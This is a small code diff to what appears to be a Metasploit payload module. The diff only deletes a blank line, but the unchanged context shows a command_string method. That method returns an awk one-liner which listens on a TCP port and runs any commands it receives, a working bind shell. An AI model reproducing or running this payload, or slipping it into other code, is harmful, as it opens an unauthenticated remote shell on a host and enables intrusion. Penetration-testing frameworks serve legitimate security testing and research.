@@ -51,5 +51,4 @@ module MetasploitModule
   def command_string
     "awk 'BEGIN{s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
   end
-
 end
